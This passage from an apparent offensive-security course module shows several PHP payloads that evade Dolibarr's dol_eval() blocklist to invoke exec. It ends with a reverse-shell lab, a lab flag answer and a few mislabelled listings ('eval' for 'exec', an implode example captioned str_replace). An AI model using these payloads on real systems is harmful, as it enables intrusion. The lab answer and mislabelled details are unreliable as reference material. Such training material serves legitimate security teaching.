Listing 25 - Payload proof-of-concept using str_rot13() for decoding

We could also convert exec to hexadecimal and back to a string to bypass the restrictions in dol_eval().

11.5.3. Alternate String Modifications
Instead of encoding part of our payload, we could also use string manipulation to bypass the restrictions in dol_eval(). PHP includes many string functions that we could use in our payload to bypass the blocklist. We'll review a few examples in this section, but won't cover every possible function.

We could use str_replace() to construct "exec" in a variety of ways.

For example, we could reconstruct "eval" by replacing each occurrence of "z" with "e", as shown below.

(new ReflectionFunction(str_replace("z", "e","zxzc")))->invoke('hostname');
Listing 26 - Payload proof-of-concept using str_replace()

We could also use implode() to join an array of strings with a separator.

(new ReflectionFunction(implode("x", array("e","ec"))))->invoke('hostname');
Listing 27 - Payload proof-of-concept using str_replace()

The example above constructs "exec" by joining "e" and "ec" with "x".

The last example we'll review involves strip_tags(). Most applications use this function to prevent XSS and code injection vulnerabilities. We can use the function in our payload to bypass the blocklist restrictions by including an HTML tag to break up "exec".

(new ReflectionFunction(strip_tags("ex<a>ec")))->invoke('hostname');
Listing 28 - Payload proof-of-concept using strip_tags()

The strip_tags() function will remove "<a>" and return "exec".

In addition to providing multiple ways to bypass the blocklist in dol_eval(), many of these string functions allow us to avoid special characters. These payloads would allow us to target other parts of the application that call dol_eval() using the $onlysimplestring parameter with more restrictive values.

Resources
Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Dolibarr - Bypass Revisited	
192.168.184.141
Labs
The Dolibarr - Bypass Revisited VM contains a modification to the Dolibarr original code to harden the exploitation of the vulnerability covered in this module. Use any of the techniques discussed in this Learning Unit to obtain a reverse shell. The flag is located at /flag.txt. Note that VSCode is not available for this exercise.
Answer
OS{f8ffc9ae9a8fc1cf96fb45938e54d935}
11.6. Wrapping Up
In this Learning Module, we reviewed the concept of dangerous functions and why we might target exploiting them. We examined a blocklist-based validation approach in Dolibarr and crafted a payload that could bypass the validation by determining what values the application blocks and finding alternative ways to call blocked functions. Finally, we reviewed several additional ways to bypass keyword-based blocklists. While the application we reviewed used PHP, these lessons apply to any programming language.


